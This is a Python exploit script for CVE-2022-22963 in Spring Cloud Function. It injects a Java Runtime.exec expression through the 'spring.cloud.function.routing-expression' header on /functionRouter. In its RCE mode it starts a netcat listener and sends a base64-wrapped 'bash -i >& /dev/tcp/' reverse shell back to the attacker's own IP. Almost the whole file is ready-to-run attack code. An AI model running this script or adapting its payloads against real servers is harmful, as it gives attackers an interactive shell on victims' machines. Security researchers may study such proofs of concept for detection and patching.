#! /usr/bin/python3
# CVE-2022-22963
# Spring Cloud Function RCE
# Affects versions : Spring Cloud Function ~3.1.6, ~3.2.2

import subprocess
import argparse 
import requests
import socket, sys, time
from threading import Thread
import base64
import os

print('''=========================================
            CVE-2022-22963
    Spring Cloud Function RCE
=========================================''')

cyan = "\033[1;36m"
reset = "\033[0m"
blue = "\033[1;34m"
red = "\033[1;31m"

parser = argparse.ArgumentParser(description="hint : CVE-2022-22963.py -u http://localhost:8080 -rce")
parser.add_argument("-u","--URL", required=False, help='Target server URL (e.g., http://localhost:8080/)')
parser.add_argument("-p","--PORT", required=False, help='Target server PORT (e.g., http://localhost:8080/)')
parser.add_argument("-rce","--RCE", required=False, help='remote code execution mode', action='store_true')
args = parser.parse_args()


def nc_listener():
    os.system("nc -lnvp 22963")


def Get_My_IP():
    result = subprocess.run(['hostname', '-I'], stdout=subprocess.PIPE, text=True)
    ip = result.stdout.strip().split()[0]
    return ip
attacker_IP = Get_My_IP()


def Detected_Vulnerability(port): 
    url=f'http://localhost:{port}/functionRouter' # spring 기본 경로: localhost:8080
    payload = f'T(java.lang.Runtime).getRuntime().exec("touch /tmp/cve-2022-22963")'
    body = '.'
    headers = {'spring.cloud.function.routing-expression':payload}
    
    try:
        response = requests.post(url = url, data = body, headers = headers, verify=False, timeout=5)
        if response.status_code == 500:
            return True
        else:
            return False
    except requests.RequestException as e:
        return False



def exploit(URL, RCE):
    #PoC
    url = f'{URL}/functionRouter'
    payload = f'T(java.lang.Runtime).getRuntime().exec("{RCE}")'
    body = '.'
    headers = {'spring.cloud.function.routing-expression':payload}

    try:
        response = requests.post(url = url, data = body, headers = headers, verify=False, timeout=5)
        print(f"{cyan}[+] Remote Code Execution successful!{reset}")
        return response 

    except requests.RequestException as e:
        print(f"{red}[-] Remote Code Execution failed: {str(e)} {reset}")
        return False



if __name__ == "__main__":
    if Detected_Vulnerability(args.PORT or "8000"):

        print(f"{cyan}[+] Detected Vulnerability : True{reset}\n")

        if args.URL is None or args.RCE is None:
            print(f"{blue}[*] To test for Remote Code Execution, please execute the command below {reset}\n")
            parser.print_help()

        else:
            print(f"[+] Target URL: {args.URL}")

            #nc
            listener_thread = Thread(target=nc_listener)
            listener_thread.start()
            time.sleep(1)

            command = f"bash -i >& /dev/tcp/{attacker_IP}/22963 0>&1"
            rce_command = 'bash -c {echo,' + ((str(base64.b64encode(command.encode('utf-8')))).strip('b')).strip("'") + '}|{base64,-d}|{bash,-i}'

            exploit(args.URL,rce_command)
        
    else:
        print(f"{red}[-] Detected Vulnerability : False{reset}")